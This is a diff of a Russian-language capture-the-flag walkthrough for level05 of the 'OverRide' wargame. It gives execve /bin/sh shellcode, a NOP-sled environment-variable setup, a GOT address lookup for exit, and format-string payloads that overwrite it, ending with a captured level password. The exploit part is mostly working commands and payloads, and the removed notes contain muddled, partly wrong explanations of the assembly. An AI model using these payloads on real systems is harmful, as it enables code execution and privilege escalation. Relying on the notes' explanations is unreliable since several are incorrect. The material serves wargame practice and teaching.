@@ -36,101 +36,16 @@ bbbbb
 Здесь нам необходимо воспользоваться готовым shellcode, чтобы запустить в памяти
 наш /bin/sh:
 
-Что происходит в Shellcode:
-
-char sc[] = "\x6a\x0b" // push byte +0xb
-"\x58" // pop eax <-- очистка содержания eax
-"\x99" // cdq <-- Convert double to quadruple - увеличивает содержание, чтобы поместился весь код
-https://indigobits.com/assembler/12-komandy-rasshireniya.html
-"\x52" // push edx <-- send to stack
-"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f <-- push address of bin
-"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f <-- push address of sh
-"\x89\xe3" // mov ebx, esp 
-esp is register of pointer of stack
-ebx is base of memory which temporary keep what did upper
-and move it to esp (to stack)
-"\x31\xc9" // xor ecx, ecx
-ecx is counter of operations (usually in order)
-при xor обнуляется счётчик выполнения команд.
-http://natalia.appmat.ru/c&c++/assembler.html
-"\xcd\x80"; // int 0x80
-is system call of kernel than to say to perform
-what is writed in up
-
-Сам Shellcode:
-\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
-
-Ищем адрес exit, чтобы перезаписать его на наш shellcode:
-
-level05@OverRide:~$ objdump -R ./level05
-
-./level05:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-080497c4 R_386_GLOB_DAT    __gmon_start__
-080497f0 R_386_COPY        stdin
-080497d4 R_386_JUMP_SLOT   printf
-080497d8 R_386_JUMP_SLOT   fgets
-080497dc R_386_JUMP_SLOT   __gmon_start__
-080497e0 R_386_JUMP_SLOT   exit
-080497e4 R_386_JUMP_SLOT   __libc_start_main
-
-0x080497e0 это адрес exit в GOT.
-GOT - глобальная таблица смещений, в которой хранятся адреса библиотечных функций. Когда программа запускается, адрес функции библиотеки устанавливается в GOT. Поскольку функции динамической библиотеки загружаются только тогда, когда они используются, таблица GOT изначально пуста.
-
-Закинем наш shellcode в env:
-
-export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
-
-\x90 это пустота, которой заполняем массив внутри программы. Массив состоит из 100 единиц.
-А дальше наш Shellcode для исполнения.
-
-> env | grep SHELLCODE
-проверяем, что SHELLCODE доступен.
-
-Дальше узнаём адрес нашей переменной окружения:
-gcc -m32 find_address.c -o find_address
-Обычно gcc компилирует код под 32х битную систему. А у нас система 64х битная.
-Чтобы программа скомпилировалась для 64х битной, следует добавить флаг -m32. 
-и:
-level05@OverRide:/tmp$ ./find_address SHELLCODE
-env address at 0xffffd86f
-
-Дальше делим адрес на две части, т.к. настоящий адрес в целочисленном виде не вместится в char, который
-печатается в vfprintf. 
-
-дальше идёт мусор:
-
-0xffff = 65535
-d86e = 55406
-
-ffff - 65535
-d86f - 55399
-#55406 - 8 = 55398
-#65535 - 55398 = 10129
-
-Shellcode это у нас целочисленное? Почему?
-Почему shellcode закидывается с мусором первые 100-90 символов, а потом шеллкод?
-Почему у меня адрес выходит слишком большой?
-level05@OverRide:/tmp$ ./a.out SHELLCODE
-env address at 0x7fffffffe8ac
-
-(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55399d' + '%10\$hn' + '%10136d' + '%11\$hn'"; cat - ) | ./level05
-
-ffff - 65535
-d7ed - 55277 = 55268
-10258
-
-
-(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54995x " + "%10$n" + "%10531x" + "%11$n"'; cat) | ./level05
-
-0xffff = 65535
-d6dc = 54995
-10531
-
-55127
-10399
-
 http://shell-storm.org/shellcode/files/shellcode-827.php
-https://github.com/G33f/42_Override/blob/master/level05/Ressources/walkthrough.txt
+Выкладываем наш ShellCode в переменные окружения
+export SHELLCODE=`python -c 'print("\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+
+x90 это nope, а 100000 это дойти до конца стэка и закинуть наш Shellcode. В Shellcode закидываются данные
+из переменных в стэк, а затем заполняется адресом execve и bin/sh для выполнения и выход с.
+
+Помещаем затем наш shellcode по 10 и 11 адресам соответственно.
+Дальше по 10 и 11 адресам exit помещаем адреса стэка для выполнения Shellcode-a:
+cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
